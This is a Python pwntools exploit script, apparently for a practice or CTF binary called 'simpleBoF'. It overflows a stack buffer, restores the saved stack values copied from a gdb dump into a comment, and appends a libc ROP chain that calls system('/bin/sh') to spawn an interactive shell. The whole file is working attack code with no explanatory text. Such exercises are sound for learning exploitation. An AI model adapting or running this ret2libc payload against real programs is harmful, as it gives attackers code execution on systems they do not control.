#!/usr/bin/python

from pwn import *

prog = "./simpleBoF"
context.arch = "amd64"
binary = elf.ELF(prog)

libc = binary.libc
libc.address = 0x00007ffff7a3c000
conn = process(prog)

# [------------------------------------stack-------------------------------------]
# 0000| 0x7fffffffdd90 --> 0x4005c0 
# 0008| 0x7fffffffdd98 --> 0x400490 (<_start>:	xor    ebp,ebp)
# 0016| 0x7fffffffdda0 --> 0x7fffffffde90 --> 0x1 
# 0024| 0x7fffffffdda8 --> 0x0 
# 0032| 0x7fffffffddb0 --> 0x4005c0 (<__libc_csu_init>:	push   r15)
# 0040| 0x7fffffffddb8 rip 0x7ffff7a5c2b1 (<__libc_start_main+241>:	mov    edi,eax)

# make memory the same is it was before the gets
payload =  p64(0x4005c0)
payload += p64(0x400490)
payload += p64(0x7fffffffde90)
payload += p64(0x0)
payload += p64(0x4005c0)

rop = ROP(libc)
rop.system(list(libc.search("/bin/sh"))[0])
print rop.dump()
payload += str(rop)

with open("payload", 'w') as f:
	f.write(payload + "\n")

conn.sendline(payload)
conn.interactive()
